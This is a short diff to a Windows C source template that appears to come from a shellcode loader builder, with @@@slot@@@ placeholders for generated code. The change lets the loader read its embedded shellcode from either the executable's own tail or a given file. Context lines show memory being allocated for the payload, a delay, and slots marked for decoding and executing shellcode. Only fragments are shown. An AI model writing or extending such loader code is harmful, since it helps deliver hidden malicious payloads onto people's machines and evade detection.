@@ -1,15 +1,20 @@
 #include <windows.h>
 #include <shlwapi.h>
 
-int read_pe_slot(int index, void *pdata) {
+int read_file_slot(LPCWSTR file_name, int index, void *pdata) {
 	HANDLE h_file = NULL;
 	DWORD num_read = 0;
-	WCHAR file_name[MAX_PATH];
 	DWORD data_size=0;
 	DWORD file_tail=0;
 	
-	GetModuleFileNameW(NULL, file_name, MAX_PATH);
-	h_file = CreateFileW(file_name, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
+	if(!file_name) {
+		WCHAR file_name_buf[MAX_PATH];
+		GetModuleFileNameW(NULL, file_name_buf, MAX_PATH);
+		h_file = CreateFileW(file_name_buf, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
+	} else {
+		h_file = CreateFileW(file_name, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
+	}
+	
 	file_tail = SetFilePointer(h_file, 0, NULL, FILE_END);
 	
 	SetFilePointer(h_file, file_tail-4, NULL, FILE_BEGIN);
@@ -112,9 +117,9 @@ void handler() {
 		// do something before exec shellcode
 		@@@slot_2@@@
 		
-		DWORD sc_size = read_pe_slot(0, NULL);
+		DWORD sc_size = read_file_slot(@@@slot_4@@@, 0, NULL);
 		PVOID p_sc = alloc(sc_size);
-		read_pe_slot(0, p_sc);
+		read_file_slot(@@@slot_4@@@, 0, p_sc);
 		WaitForSingleObject(GetCurrentProcess(), @@@slot_0@@@);
 		// decode shellcode
 		@@@slot_1@@@
